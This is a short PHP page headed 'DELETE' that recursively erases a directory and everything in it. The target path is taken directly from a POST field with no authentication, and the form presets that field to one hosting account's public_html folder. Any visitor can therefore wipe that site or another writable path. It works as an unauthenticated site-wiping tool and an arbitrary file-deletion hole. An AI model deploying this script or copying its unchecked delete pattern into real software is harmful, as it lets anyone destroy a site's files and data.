<?php
    function remove_directory($directory) {
        if (!is_dir($directory)) return;

        $contents = scandir($directory);
        unset($contents[0], $contents[1]);

        foreach($contents as $object) {
            $current_object = $directory.'/'.$object;
            if (filetype($current_object) === 'dir') {
                remove_directory($current_object);
            } else {
                unlink($current_object);    
            }
        }

        rmdir($directory);
    }

    if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['dir'])) {
        $dir = $_POST['dir'];
        if ($dir[0] != '.') remove_directory("$dir");
    }
    ?>
    <h1>DELETE</h1>
    <form action="" method="post">
        <input type="hidden" name="dir" value="/home/vipone/public_html/jetx.lalabetix.com/" />
        <input type="submit" name="delete"/>
    </form>